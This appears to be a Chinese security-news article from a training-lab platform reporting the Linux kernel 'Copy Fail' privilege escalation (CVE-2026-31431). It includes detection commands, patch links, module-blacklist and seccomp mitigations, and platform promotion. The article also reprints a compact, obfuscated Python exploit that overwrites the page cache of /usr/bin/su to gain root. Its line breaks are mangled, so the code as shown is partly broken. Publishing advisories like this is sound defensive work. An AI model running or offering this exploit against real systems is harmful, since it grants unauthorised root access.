#  [漏洞播报]炸了！Linux高危漏洞Copy Fail来袭，732字节脚本秒提root  
原创 Elon
                    Elon  好靶场   2026-04-30 03:10  
  
# [漏洞播报]炸了！Linux高危漏洞Copy Fail来袭，732字节脚本秒提root  
> 💡 好靶场 团队宗旨：我们立志于为所有的网络安全同伴制作出好的靶场，让所有初学者都可以用最低的成本入门网络安全。所以我们团队名称就叫“好靶场”。  
  
  
我们承诺每天至少更新1-2个新靶场，目前靶场800+；好靶场追求的是稳定日常更新而不仅仅是数量。  
  
 好靶场使用教程：[【好靶场】用户使用指南](https://mp.weixin.qq.com/s?__biz=Mzg4MDg5NzAxMQ==&mid=2247486175&idx=1&sn=d4fd496c04eff81802f2c1be30f77b78&scene=21#wechat_redirect)  
  
## 1.好靶场介绍  
  
**官网链接http://www.loveli.com.cn/**  
> 零基础入门不迷茫！ 专属网络安全从零到一体系化训练——配套完整靶场+精选学习资料，帮你快速搭建网安知识框架，迈出入门关键一步！ 全场景实战全覆盖！ 聚焦Web渗透工程师核心能力，深度拆解TOP10逻辑漏洞，精通PHP代码审计、Java代码审计等核心技能，从基础原理到实战攻防，覆盖行业高频应用场景！ 真实漏洞场景沉浸式体验！src训练专题重磅上线——1:1还原真实漏洞报告，让你亲身感受实战挖洞流程，积累符合企业需求的实战经验！  
  
  
🚀哈喽～各位宝子们周四中午好~~👋！今日为大家带来的是关于炸了！Linux高危漏洞Copy Fail来袭，732字节脚本秒提root，2017后系统全中招的内容，这一次又是一个厉害的漏洞，宝子们请注意修复，接下来进行漏洞的详细的报道；以下的详细内容👇  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvJq1k77LKgzo4Lq4g1ADlWldLaWiah533Wbh9Vuh5GXJqakyaeuw92tvxGdicVxhjlWU3pZAZPr37tIqj0ONkaUdFRC2g8vSYH7E/640?wx_fmt=png&from=appmsg "")  
## 2. 报道内容  
  
2026年4月29日，一个名为「Copy Fail」的Linux内核高危漏洞被公开披露，CVE编号为CVE-2026-31431。这个漏洞恐怖到什么程度？无需复杂操作，一个仅732字节的Python脚本，普通用户就能直接提权至root，覆盖2017年以来几乎所有主流Linux发行版，甚至能实现容器逃逸，风险拉满！  
### 一、漏洞核心信息：为什么它如此危险？  
  
先给大家划重点，用最直白的话讲清这个漏洞的关键信息，不用纠结复杂术语：  
- 漏洞名称：Copy Fail（复制失败漏洞）  
  
- 漏洞类型：本地特权提升（LPE），简单说就是“普通用户变超级管理员”  
  
- 风险⚠️：高风险，本地低权限即可直接获取高权限  
  
- 影响范围：Linux内核4.14～6.18.21、6.19.0～6.19.11、7.0-rc1～7.0-rcN，2017年后的Ubuntu、CentOS、Debian、Fedora等主流发行版均受影响（默认开启受影响模块）  
  
- 利用难度：极低！无需编译、无需竞争条件、无需计算偏移，仅用系统自带Python环境，运行脚本就能提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJCIz2yd06WCRsJX42wQ9yLtNSiaKt7F81tBIQJyYVqTZMLSKewvteN2Bu29Dev0bFxKuQ0TchXib16IjEZ3vPI4ViajD3xTDLOx8/640?wx_fmt=png&from=appmsg "")  
### 二、漏洞详情  
  
Linux Kernel 是全球最广泛使用的开源操作系统内核，它是 Linux 系统的核心组件，负责管理硬件资源、进程调度、内存管理、文件系统和网络功能等底层任务。  
  
据描述，在 Linux 内核的 authencesn 加密模板与 algif_aead 模块的组合实现中，由于 AF_ALG 套接字的 AEAD 解密路径在 2017 年引入了一个就地（in-place）操作优化（提交 72548b093ee3），将 splice() 传递过来的目标文件页缓存页面直接链入可写的输出散列表（scatterlist）。而 authencesn 算法在实现 IPsec 扩展序列号（ESN）支持时，为了重排认证数据中的序列号字节，会在解密过程中将接收缓冲区偏移 assoclen + cryptlen 位置作为临时存储空间写入 4 字节数据。当 AF_ALG 通过 recvmsg() 触发解密操作时，该写入会跨越接收缓冲区边界，直接覆盖链在后面的页缓存页面，从而实现对任意已打开的可读文件的页缓存进行受控的 4 字节篡改，最终导致本地低权限攻击者可通过篡改系统上任意可读文件（如 /usr/bin/su 等 setuid 程序）的页缓存内容，无需竞争条件或重试即可直接获得 root 权限，且该写入不会触发磁盘脏页回写，可实现持久化提权等危害。  
### 漏洞EXP(目前已公开)  
```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o) try:u.recv(8+t) except:0f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))while i<len(e):c(f,i,e[i:i+4]);i+=4g.system("su")
```  
  
**安全版本**  
```
commit >= a664bf3d603d

```  
  
**排查方法**  
```
检查内核版本
uname -r

```  
  
检查内核配置是否启用  
```
grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)

```  
  
检查模块是否已加载受影响模块  
```
lsmod | grep algif

```  
  
检查 AF_ALG socket 是否可创建  
```
python3 -c "import socket; socket.socket(38,5,0); print('VULNERABLE')"

```  
  
修复建议  
1. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，升级至安全版本 https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5  
  
1. 针对 Ubuntu、Red Hat Enterprise Linux 等用户，官方暂未发布安全更新，请及时关注官方安全公告 https://ubuntu.com/security/CVE-2026-31431 https://access.redhat.com/security/cve/cve-2026-31431  
  
1. 缓解措施： 禁止模块加载  
  
```
echo "blacklist algif_aead"|sudo tee /etc/modprobe.d/blacklist-algif_aead.conf

```  
  
卸载已加载模块  
```
rmmod algif_aead 2>/dev/null || true

```  
  
验证  
```
lsmod | grep algif_aead

```  
1. 容器环境加固 通过 seccomp 禁止 AF_ALG socket 创建（family=38）：  
  
```
"syscalls": [{  "names": ["socket"],  "action": "SCMP_ACT_ERRNO",  "args": [{"index": 0, "value": 38, "op": "SCMP_CMP_EQ"}]}]

```  
  
参考链接  
```
Github地址：https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py

```  
## 3. 如何使用好靶场  
  
首先关注“好靶场微信公众号”然后发送bug，可以点击链接直接登录  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvJn80Sicpic7OmticxNKsrrgJFTNUhAftHBnCibiaicLFUCB8ehvyT0PrXEG4lDcsnvDLAqJSBQlHz0V4F8SIF5gpO9iaNiaH97PBFjQRw/640?wx_fmt=png&from=appmsg "")  
## 4. 福利  
  
福利1： 找到个人中心，邀请码输入0482d6d28539424c，白嫖14天高级会员。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLCicFgYymsZVpugibO1C8AVsib8XicsA53jA7a050c434b35AhxXQHcdCOzjtRl9N3GpUzIsFdNXY0rh56Mll8dmpKNJIib98uZvibQ/640?wx_fmt=png&from=appmsg "")  
  
福利2： 关注好靶场bilibili。拿着关注截图找到客服，领取5积分或者7天高级会员。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvIicU6vDElyplQWIXkDdgNCmMkL9xCMOx9EsUKtNN4OhyBrAGbMo3QkpzFS5OP8ETAdLenHsJAjz3XCVrfnBSu186zyaqERbsLk/640?wx_fmt=png&from=appmsg "")  
## 5. 每日限免  
  
每日限免 为了能让更多的宝子可以免费的开启会员靶场，我们会在工作日随机开放一些靶场的限免，还请加群关注。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJguqkEichc2zwjCTwfQsl8FW56dZAlNmdDAbLVarx22icu0Y6sJibk94vBBoibkNU3htXEknvAVQQCObYtlB51hatQab1ibRp13a98/640?wx_fmt=png&from=appmsg "")  
  
我们会在微信群、QQ群每天更新限免靶场，以及免费学习资料；任选一个群添加即可，所有的通知都会到位在交流群通知，请添加好友，我将邀请你加入“好靶场内部交流群”  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvKvSCywPlC90S8mWg9fr8xxhWShHvJ3z1njibcmLCFHchA6Xl70fByLuek75ZgF8uUR5r8wqQJT730tcQvzD7ATHIdIibj1Yq3Io/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvL62Jib8LO4pnzu27PofUnice4tk9fv57UjsK6dySBood4KOYYIyqcyzG8xdksv5hWMltXV27rSiaQBoXbQd4scwms3D2oXp5PX3A/640?wx_fmt=png&from=appmsg "")  
## 6. 好靶场AI客服机器人  
  
为方便学习还有提问，我们设计了好靶场Ai客服机器人，可以完成简单的客服能力，以及好靶场日常靶场提醒更新、根据你的询问推荐靶场  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJWgicVJZCqicFqHryHf2oekbyLAic3fkgiaibJeZF3sofXCBPJj1EokyFA6CWGqoah7K5wGP9fGgRbXrof4QwkGm8sFV8PLUZlBdicA/640?wx_fmt=png&from=appmsg "")  
> “噜噜大王”正式上线  
  
  
大家点击左边的快捷工具，有一个AI助教功能，然后点开就可以和噜噜大王对话啦，由于是内测期间，仅限于年会员才可以进行使用。还需要进行微调，会随着大家的使用而进行优化。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvJSxbVlnJchvtXVlonJvkNLUfFWLn1ibgj5cOibtHx0RjiagHa1AAlOPwE3KQD3IpUkicN3tktCtACMaCice00ZMs7hAaibnlFLdwGso/640?wx_fmt=png&from=appmsg "")  
  
你可以尝试问一下关于打靶场的问题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLY7BHaJcYfXMEacfM7wuwSxkaTJ8odfpO7j5bLXwib1Uuic0Hc5yr4iaU3hAcE8vRVySnRfQUv3QKb306X2cUmPa2E46fs2LFgIw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvLicRSPx4NXENbaPVxeF2rLIuyHArtS8HOoIM8TfID3wFxo8icSQDQasMxnqU9QbjfXskbHibKgHbeVBw3nBZ21L65YekWYnt4xUA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJcatqLTdbqI1MI6wP5uKCiagTMKqQOvHlrRI5nIGzOg4nzIKIwfOBruOVe7cSNK7T29SwAyUY7f0tMTuqicl4aKUBAGJKPKa3A0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJkQZQagkapGxPmA54TpyG9ic1NiaMQlhCdpKSVPMGuDZiaiaAZBHrD35MqBAb3DaOxiaDe4FZgUhFwOrDpUxrcKH6AzzS1KK3xnibVc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLqz0Ib7Km2ibLlJRMh5P4mxCyIticKBGMYVQdzCESabI8o64l24pyhHgOdoupK1EuykUMJdgNJAwJFYsnQjmNibuXVvQPp182M6o/640?wx_fmt=png&from=appmsg "")  
## 🚀好靶场会员订阅  
  
好靶场会员订阅 首先点击会员订阅 ，然后选择对应的套餐 ，选择对应的会员去支付 ，支付完成后即可会员到账  
  
  
